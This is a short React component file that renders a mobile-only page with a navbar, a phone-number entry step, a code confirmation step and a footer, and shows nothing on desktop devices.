import Navbar from "./Components/NavBar/NavBar";
import Number from "./Components/Contents/Number";
import Confirm from "./Components/Contents/Confirm";
import Footer from "./Components/Footer/Footer";
import { useState } from "react";
import { isMobile } from "react-device-detect";

export default function App() {
  const [ncode, setNcode] = useState({
    number: '',
    code: '',
  });
  const [page, setPage] = useState('p');
  return (
    <div>
      {isMobile ? 
      <div>
        <Navbar />
        { page === 'p' ?
        <Number setPage={setPage} setNcode={setNcode} ncode={ncode} />
        :
        <Confirm  setNcode={setNcode} ncode={ncode} />
        }
        <Footer />
      </div>
      : ""
      }
    </div>
  );
}